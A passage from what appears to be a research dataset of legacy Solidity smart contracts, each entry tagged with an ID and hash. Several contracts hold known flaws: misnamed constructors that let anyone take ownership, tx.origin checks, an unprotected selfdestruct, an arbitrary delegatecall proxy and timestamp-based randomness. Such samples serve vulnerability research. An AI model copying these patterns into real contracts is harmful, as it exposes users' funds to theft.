    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_8b881d18ff63

文件 `units/program.sol`；SHA256 `28c7fb0808111a4aadde8e352146fbb52bedd9ce77ddc9f89bc27baf2f903e95`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.21;
contract owned {
    address public owner;
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
    function destruct() public onlyOwner {
        selfdestruct(owner);
    }
}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function TokenERC20() public {
        totalSupply = 10000000000 * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = "One Exchange Token";                                   
        symbol = "1X";                               
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}
contract OneExchangeToken is owned, TokenERC20 {
    uint256 public sellPrice;
    uint256 public buyPrice;
	uint256 public decimals = 18;
	string  public tokenName;
	string  public tokenSymbol;
	string  public tokenDescription;
	uint minBalanceForAccounts;                                         
    mapping (address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
	function WorldSafetySecurityToken() public {
		owner = msg.sender;
		totalSupply = 10000000000000000000000000000;
		balanceOf[owner]=totalSupply;
		tokenName="One Exchange Token";
		tokenSymbol="1X";
	}
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);                               
        require (balanceOf[_from] >= _value);               
        require (balanceOf[_to] + _value > balanceOf[_to]); 
        require(!frozenAccount[_from]);                     
        require(!frozenAccount[_to]);                       
        balanceOf[_from] -= _value;                         
        balanceOf[_to] += _value;                           
        emit Transfer(_from, _to, _value);
    }
    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        emit Transfer(0, this, mintedAmount);
        emit Transfer(this, target, mintedAmount);
    }
    function freezeAccount(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }
    function buy() payable public {
        uint amount = msg.value / buyPrice;               
        _transfer(this, msg.sender, amount);              
    }
    function sell(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount * sellPrice);      
        _transfer(msg.sender, this, amount);              
        msg.sender.transfer(amount * sellPrice);          
    }
	function setMinBalance(uint minimumBalanceInFinney) public onlyOwner {
		minBalanceForAccounts = minimumBalanceInFinney * 1 finney;
	}
	function setTokenName(string newTokenName) public onlyOwner{
		tokenName = newTokenName;
		name	= newTokenName;
	}
	function setTokenSymbol(string newTokenSymbol) public onlyOwner{
		tokenSymbol = newTokenSymbol;
		symbol = newTokenSymbol;
	}
	function setTokenDescription(string newDescription)public onlyOwner{
		tokenDescription = newDescription;
	}
    function AirDrop(address[] dests, uint256[] values) public onlyOwner returns(uint256) {
        uint256 i = 0;
        while (i < dests.length) {
			_transfer(this,dests[i], values[i]);
            i += 1;
        }
        return i;
    }
}
```

## RQ1_50afc53073f9

文件 `units/program.sol`；SHA256 `7357608b25fee40868cff35b0bdb8e3fe9c3cff923240319ffc0af9b48f31a53`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.23;
library SafeMath {
function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
assert(c / a == b);
return c;
}
function div(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a / b;
return c;
}
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
assert(b <= a);
return a - b;
}
function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
assert(c >= a);
return c;
}
}
contract DarkLord {
using SafeMath for uint256;
event NewZombie(uint zombieId, string name, uint dna);
mapping(address => uint) playerExp;
mapping (address => bool) private inwitness;
address[] public winnerAdd;
modifier onlyWit() {
require(inwitness[msg.sender]);
_;
}
struct Battlelog {
uint id1;
uint id2;
uint result;
address witness;
}
Battlelog[] battleresults;
struct BMBattlelog {
uint id1;
uint id2;
uint id3;
uint id4;
uint result;
address witness;
}
BMBattlelog[] bmbattleresults;
function _addWit (address _inwitness) private {
inwitness[_inwitness] = true;
}
function _delWit (address _inwitness) private {
delete inwitness[_inwitness];
}
function initialWittness() public {
_addWit(msg.sender);
}
function clearwit(address _inwitness) public{
if(_inwitness==msg.sender){
delete inwitness[_inwitness];
}
}
function initialCard(uint total) public view returns(uint i) {
i = uint256(sha256(abi.encodePacked(block.timestamp, block.number-i-1))) % total +1;
}
function initialBattle(uint id1,uint total1,uint id2,uint total2) onlyWit() public returns (uint wid){
uint darklord;
if(total1.mul(2)>5000){
darklord=total1.mul(2);
}else{
darklord=5000;
}
uint256 threshold = dataCalc(total1.add(total2),darklord);
uint256 i = uint256(sha256(abi.encodePacked(block.timestamp, block.number-i-1))) % 100 +1;
if(i <= threshold){
wid = 0;
winnerAdd.push(msg.sender);
}else{
wid = 1;
}
battleresults.push(Battlelog(id1,id2,wid,msg.sender));
_delWit(msg.sender);
}
function initialBM(uint id1,uint total1,uint id2,uint total2,uint id3,uint total3,uint id4,uint total4) onlyWit() public returns (uint wid){
uint teamETH;
uint teamTron;
teamETH=total1+total2;
teamTron=total3+total4;
uint256 threshold = dataCalc(teamETH,teamTron);
uint256 i = uint256(sha256(abi.encodePacked(block.timestamp, block.number-i-1))) % 100 +1;
if(i <= threshold){
wid = 0;
winnerAdd.push(msg.sender);
}else{
wid = 1;
}
bmbattleresults.push(BMBattlelog(id1,id2,id3,id4,wid,msg.sender));
_delWit(msg.sender);
}
function dataCalc(uint _total1, uint _total2) public pure returns (uint256 _threshold){
uint256 threshold = _total1.mul(100).div(_total1+_total2);
if(threshold > 90){
threshold = 90;
}
if(threshold < 10){
threshold = 10;
}
return threshold;
}
function getBattleDetails(uint _battleId) public view returns (
uint _id1,
uint _id2,
uint256 _result,
address _witadd
) {
Battlelog storage _battle = battleresults[_battleId];
_id1 = _battle.id1;
_id2 = _battle.id2;
_result = _battle.result;
_witadd = _battle.witness;
}
function getBMBattleDetails(uint _battleId) public view returns (
uint _id1,
uint _id2,
uint _id3,
uint _id4,
uint256 _result,
address _witadd
) {
BMBattlelog storage _battle = bmbattleresults[_battleId];
_id1 = _battle.id1;
_id2 = _battle.id2;
_id3 = _battle.id3;
_id4 = _battle.id4;
_result = _battle.result;
_witadd = _battle.witness;
}
function totalSupply() public view returns (uint256 _totalSupply) {
return battleresults.length;
}
function totalBmSupply() public view returns (uint256 _totalSupply) {
return bmbattleresults.length;
}
}
```

## RQ1_45ce1fe8110b

文件 `units/program.sol`；SHA256 `9732c01e185920c314498c7294184f56684e9442473ae560f7df3ad65b083403`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.11;
contract InfiniteGold {
    string public name = "Infinite Gold";
    string public symbol = "0IGOLD";
    uint256 public decimals = 2;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    address[] addresses;
    uint[] values;
    uint256 public totalSupply = 13400000;
    bool public stopped = false;
    uint256 constant valueFounder = 13400000;
    address owner = 0x0;
    modifier isOwner {
        assert(owner == msg.sender);
        _;
    }
    modifier isRunning {
        assert (!stopped);
        _;
    }
    modifier validAddress {
        assert(0x0 != msg.sender);
        _;
    }
    function IotaGoldToken(address _addressFounder) {
        owner = msg.sender;
        totalSupply = valueFounder;
        balanceOf[_addressFounder] = valueFounder;
        Transfer(0x0, _addressFounder, valueFounder);
    }
    function transfer(address _to, uint256 _value) isRunning validAddress returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) isRunning validAddress returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        require(allowance[_from][msg.sender] >= _value);
        balanceOf[_to] += _value;
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) isRunning validAddress returns (bool success) {
        require(_value == 0 || allowance[msg.sender][_spender] == 0);
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function stop() isOwner {
        stopped = true;
    }
    function start() isOwner {
        stopped = false;
    }
    function setName(string _name) isOwner {
        name = _name;
    }
    function burn(uint256 _value) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[0x0] += _value;
        Transfer(msg.sender, 0x0, _value);
    }
    function TokenDrop(address[] _addresses, uint256[] _values) payable returns(bool){
        for (uint i = 0; i < _addresses.length; i++) {
            transfer(_addresses[i], _values[i]);
        }
        return true;
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
```

## RQ1_be17ecaef698

文件 `units/program.sol`；SHA256 `3a6cc931607fb5f3cc92ab9793d83b36c04176c5f20cf7f92ecda061ee0b0d66`；位置按UTF-8字节。

```solidity
pragma solidity ^0.5.7;
contract WhoWillRuleWesterosAtTheEnd {
    uint8 public constant Withdraw = 0;
    uint8 public constant firstHero = 1;
    uint8 public constant lastHero = 49;
    uint8 public constant ArraySize = lastHero + 1;
    mapping(address => bool) sith;
    mapping(address => uint256[ArraySize]) public bets;
    uint256[ArraySize] public betAmount;
    uint256[ArraySize] public playerCount;
    uint256 public resultWin = 0;
    uint256 public winRatio;
    uint256 constant minBet = 0.001 ether;
    uint256 constant RR = 100000000000000;
    uint256 sithCount;
    uint256 public likeDAPP;
    bool public endBetting = false;
    bool public startPayment = false;
    bool public onPause = false;
    address payable Martin;
    address payable George;
    event Bet(address indexed _who, uint8 _hero, uint256 amount);
    modifier onlySiths {
        require(sith[msg.sender] == true);
        _;
    }
    constructor(address payable _M, address payable _G) public {
        Martin = _M;
        George = _G;
        sith[msg.sender] = true;
        sithCount++;
    }
    function like() external {
        likeDAPP++;
    }
    function dislike() external {
        if (likeDAPP > 0) {
            likeDAPP--;
        }
    }
    function getLikes() external view returns (uint256) {
        return likeDAPP;
    }
    function setBet(uint8 _hero) external payable {
        require(onPause == false);
        require(msg.value >= minBet);
        require(endBetting == false);
        require(_hero >= firstHero || _hero <= lastHero);
        if (bets[msg.sender][_hero] == 0) {
            playerCount[_hero]++;
        }
        bets[msg.sender][_hero] += msg.value;
        betAmount[_hero] += msg.value;
        emit Bet(msg.sender, _hero, msg.value);
    }
    function getProfit(address payable _winer) external {
        require(startPayment == true);
        if (resultWin == Withdraw) {
            uint256 retValue;
            for(uint256 i = firstHero; i <= lastHero; i++) {
                uint256 bet = bets[_winer][i];
                if (bet > 0) {
                    bets[_winer][i] = 0;
                    retValue += bet;
                }
            }
            if (retValue > 0) {
                _winer.transfer(retValue); 
            }
            return;
        } else {
            uint256 winersBet = bets[_winer][resultWin];
            require(winersBet > 0);
            bets[_winer][resultWin] = 0;
            playerCount[resultWin]--;
            _winer.transfer(winersBet + winersBet * winRatio / RR);
        }
    }
    function getStatistics() external view returns (uint256[2 * ArraySize] memory) {
        uint256[2 * ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = betAmount[i];
            output[i + ArraySize] = playerCount[i];
        }
        return output;
    }
    function getPlayerStatistics(address _player) external view returns (uint256[ArraySize] memory) {
        uint256[ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = bets[_player][i];
        }
        return output;
    }
    function endBetPeriod() external onlySiths {
        endBetting = true;
    }
    function setResult(uint32 _result) external onlySiths {
        require(_result >=  firstHero || _result <= lastHero);
        require(startPayment == false);
        if (betAmount[_result] == 0) {
            startWithdraw();
            return;
        }
        uint256 donation = (address(this).balance - betAmount[_result]) / 10;
        Martin.transfer(donation / 2);
        George.transfer(donation / 2);
        uint256 totalBets = (address(this).balance - betAmount[_result]);
        winRatio = totalBets * RR / betAmount[_result];
        resultWin = _result;
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
    }
    function startWithdraw() public onlySiths {
        require(startPayment == false);
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
        if (resultWin != Withdraw) {
            resultWin = Withdraw;
        }
    }
    function pauseOn() external onlySiths {
        onPause = true;
    }
    function pauseOff() external onlySiths {
        onPause = false;
    }
    function clearBlockchain() external {
        require(startPayment && endBetting);
        if (resultWin == Withdraw) {
            require(address(this).balance < minBet);
            selfdestruct(msg.sender);
        } else {
            require(playerCount[resultWin] == 0);
            selfdestruct(msg.sender);
        }
    }
    function addSith(address _sith) external onlySiths {
        sith[_sith] = true;
        sithCount++;
    }
    function delSith(address _sith) external onlySiths {
        require(sithCount >= 2);
        sith[_sith] = false;
        sithCount--;
    }
}
```

## RQ1_5ee0702dae51

文件 `units/program.sol`；SHA256 `db91098d3e406328af61b0839fe9bda6b0f789608cd34ad859c38b4f92f497a7`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract Token{
    uint256 public totalSupply;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns   
    (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns 
    (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 
    _value);
}
contract SnailToken is Token {
    string public name="SnailToken";                   
    uint8 public decimals=18;              
    string public symbol="Snail";         
    address public organizer=0x06BB7b2E393671b85624128A5475bE4A8c1c03E9;
    function SnailToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {
        totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);       
        balances[msg.sender] = totalSupply; 
        name = _tokenName;                   
        decimals = _decimalUnits;          
        symbol = _tokenSymbol;
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);
        require(_to != 0x0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns 
    (bool success) {
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
        balances[_to] += _value;
        balances[_from] -= _value; 
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }
    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) public returns (bool success)   
    { 
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    function takeout(uint256 amount) public{
    require(address(this).balance>=amount*10**18);
    transfer(address(this),amount);
    msg.sender.transfer(amount*10**18);
    }
    function destroy() public{
      selfdestruct(organizer);}
}

```

## RQ1_52d5c754a744

文件 `units/program.sol`；SHA256 `bdda92dfb174696c0aa4a729c63c9ca410436612fb07a1eee0ea7401eaed5fd0`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract BlocksureInfo {
    address public owner;
    string public name;
    mapping (string => string) strings;
    function BlocksureInfo() {
        owner = tx.origin;
    }
    modifier onlyowner { if (tx.origin == owner) _; }
    function addString(string _key, string _value) onlyowner {
        strings[_key] = _value;
    }
    function setOwner(address _owner) onlyowner {
        owner = _owner;
    }
    function setName(string _name) onlyowner {
        name = _name;
    }
    function destroy() onlyowner {
        suicide(owner);
    }
}
```

## RQ1_f1e26706fa55

文件 `units/program.sol`；SHA256 `116bbdcad9f43eb6bf58171134622ea155de2a4fa9d96bfe45c485c45843e599`；位置按UTF-8字节。

```solidity
pragma solidity ^0.5.0;
contract UserProxy {
    function execute(address _target, bytes memory _data) public payable returns (bytes memory response) {
        require(_target != address(0), "user-proxy-target-address-required");
        assembly {
            let succeeded := delegatecall(sub(gas, 5000), _target, add(_data, 0x20), mload(_data), 0, 0)
            let size := returndatasize
            response := mload(0x40)
            mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(response, size)
            returndatacopy(add(response, 0x20), 0, size)
            switch iszero(succeeded)
                case 1 {
                    revert(add(response, 0x20), size)
                }
        }
    }
}
```

## RQ1_e3be5dad4539

文件 `units/program.sol`；SHA256 `dbe5c4783a7c3b8796fda3cd16b6c17e007b6838c1fa6095ce96c14857dce98a`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract AltcoinToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract NEXUS is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "NEXUS";
    string public constant symbol = "NXS";
    uint public constant decimals = 8;
    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed = 0;        
    uint256 public tokensPerEth = 20000000e8;
    uint256 public constant minContribution = 1 ether / 100; 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function nexus () public {
        owner = msg.sender;
        uint256 devTokens = 2000000000e8;
        distr(owner, devTokens);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = false;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= minContribution );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {
        AltcoinToken token = AltcoinToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_af0f1c0fc521

文件 `units/program.sol`；SHA256 `b543de11e33c4522de44f18698028ff7adf29556398b27fbd73cb175c968adc3`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.19;
contract Club {
  struct Member {
    bytes20 username;
    uint64 karma; 
    uint16 canWithdrawPeriod;
    uint16 birthPeriod;
  }
  mapping(address => Member) public members;
}
contract Button {
  event Pressed(address indexed presser, uint256 endBlock);
  event Winner(address winner, uint256 winnings);
  uint64 public countdown;
  uint64 public countdownDecrement;
  uint64 public cooloffIncrement;
  uint64 public pressFee;
  uint64 public signupFee; 
  Club public club; 
  address public lastPresser;
  uint64 public endBlock;
  struct Presser {
    uint64 numPresses;
    uint64 cooloffEnd;
  }
  mapping (address => Presser) public pressers;
  function Button(
    uint64 _countdown, 
    uint64 _countdownDecrement, 
    uint64 _cooloffIncrement, 
    uint64 _pressFee, 
    uint64 _signupFee, 
    address _club
  ) public payable {
    countdown = _countdown;
    countdownDecrement = _countdownDecrement;
    cooloffIncrement = _cooloffIncrement;
    pressFee = _pressFee;
    signupFee = _signupFee;
    club = Club(_club);
    lastPresser = msg.sender;
    endBlock = uint64(block.number + countdown);
  }
  function press() public payable {
    require(block.number <= endBlock);
    uint256 change = msg.value-pressFee;
    Presser storage p = pressers[msg.sender];
    require(p.cooloffEnd < block.number);
    if (p.numPresses == 0) {
      uint128 npf = _newPresserFee(address(this).balance - msg.value);
      change -= npf;
      address(club).transfer(npf);
    }
    require(change <= msg.value);
    lastPresser = msg.sender;
    uint64 finalCountdown = countdown - (p.numPresses*countdownDecrement);
    if (finalCountdown < 10 || finalCountdown > countdown) {
      finalCountdown = 10;
    }
    endBlock = uint64(block.number + finalCountdown);
    p.numPresses++;
    p.cooloffEnd = uint64(block.number + (p.numPresses*cooloffIncrement));
    if (change > 0) {
      msg.sender.transfer(change);
    }
    Pressed(msg.sender, endBlock);
  }
  function close() public {
    require(block.number > endBlock);
    require(lastPresser == msg.sender);
    Winner(msg.sender, address(this).balance);
    selfdestruct(msg.sender);
  }
  function newPresserFee() public view returns (uint128) {
    return _newPresserFee(address(this).balance);
  }
  function isMember() public view returns (bool) {
    return _isMember();
  }
  function _newPresserFee(uint256 _balance) private view returns (uint128) {
    if (_isMember()){
      return 0;
    }
    return uint128((_balance * signupFee) / 10000);
  }
  function _isMember() private view returns (bool) {
    var(un, k, cwp, bp) = club.members(msg.sender);
    return bp != 0;
  }
  function() payable public {}
}
```

## RQ1_0bcbefea1890

文件 `units/program.sol`；SHA256 `7638d6aaa273b279daeea22fee5118c9635e31c99901d028fe3eb15c4a184350`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;  
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
